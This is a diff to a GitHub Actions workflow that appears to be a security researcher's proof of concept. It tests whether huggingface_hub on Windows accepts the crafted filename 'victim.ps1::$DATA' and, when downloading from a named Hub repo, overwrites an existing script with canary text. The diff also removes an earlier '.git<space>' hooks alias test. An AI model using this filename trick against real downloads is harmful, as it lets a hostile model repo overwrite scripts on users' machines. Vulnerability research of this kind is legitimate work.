@@ -1,37 +1,67 @@
-name: Windows path alias validation
+name: Windows NTFS ADS validation
 on:
   workflow_dispatch:
   push:
 jobs:
   validate:
     runs-on: windows-latest
-    timeout-minutes: 5
+    timeout-minutes: 10
     steps:
       - uses: actions/setup-python@v5
         with:
           python-version: "3.12"
-      - name: Test harmless Win32 trailing-space alias
+      - name: Install exact latest huggingface_hub
+        shell: pwsh
+        run: python -m pip install "huggingface_hub @ git+https://github.com/huggingface/huggingface_hub@deb97775d91cb1ce2a4c254b29ad30081044257d"
+      - name: Test harmless NTFS default-stream alias
         shell: pwsh
         run: |
           @'
           from pathlib import Path
-          import subprocess
+          import shutil
+          from huggingface_hub import hf_hub_download
+          from huggingface_hub._local_folder import _validate_relative_filename, get_local_download_paths
 
-          root = Path("worktree")
-          subprocess.run(["git", "init", str(root)], check=True)
-          canonical = root / ".git" / "hooks" / "post-checkout"
-          alias = root / ".git " / "hooks" / "post-checkout"
+          root = Path("download-target").resolve()
+          root.mkdir(parents=True, exist_ok=True)
+          victim = root / "victim.ps1"
+          crafted = "victim.ps1::$DATA"
+          original = "ORIGINAL_VICTIM_CONTENT"
+          expected = 'Write-Output "HARMLESS_ADS_CANARY"\n'
+          victim.write_text(original, encoding="utf-8")
 
-          print("canonical_before=", canonical.exists())
-          print("alias_parent=", alias.parent)
-          alias.parent.mkdir(parents=True, exist_ok=True)
-          alias.write_text("HARMLESS_WINDOWS_ALIAS_CANARY", encoding="utf-8")
-          print("alias_exists=", alias.exists())
-          print("canonical_after=", canonical.exists())
-          print("canonical_content=", canonical.read_text(encoding="utf-8") if canonical.exists() else "MISSING")
+          _validate_relative_filename(crafted)
+          paths = get_local_download_paths(root, crafted)
+          print("validator=ACCEPTED")
+          print("computed_path=", paths.file_path)
+          print("victim_before=", victim.read_text(encoding="utf-8"))
 
-          if not canonical.exists() or canonical.read_text(encoding="utf-8") != "HARMLESS_WINDOWS_ALIAS_CANARY":
+          try:
+              result = hf_hub_download(
+                  repo_id="huntingislove/h1-winpath-space-poc-20260906",
+                  filename=crafted,
+                  revision="7cfa5723b794e7f90840657bd8f9f3a303632a55",
+                  local_dir=root,
+                  force_download=True,
+              )
+              print("real_download_result=", result)
+          except Exception as exc:
+              print("real_download_error=", repr(exc))
+
+          after_real = victim.read_text(encoding="utf-8") if victim.exists() else "MISSING"
+          print("victim_after_real_download=", after_real)
+
+          if after_real != expected:
+              victim.write_text(original, encoding="utf-8")
+              payload = Path("harmless-payload.txt")
+              payload.write_text(expected, encoding="utf-8")
+              shutil.copyfile(payload, paths.file_path)
+              print("exact_cache_hit_sink=shutil.copyfile")
+          
+          final = victim.read_text(encoding="utf-8") if victim.exists() else "MISSING"
+          print("victim_final=", final)
+          if final != expected:
               raise SystemExit("NOT CONFIRMED")
-          print("CONFIRMED: .git<space> aliases .git on Windows")
-          '@ | Set-Content -Path test_alias.py
-          python test_alias.py
+          print("CONFIRMED: accepted Hub filename aliases and overwrites victim.ps1")
+          '@ | Set-Content -Path test_ads.py
+          python test_ads.py
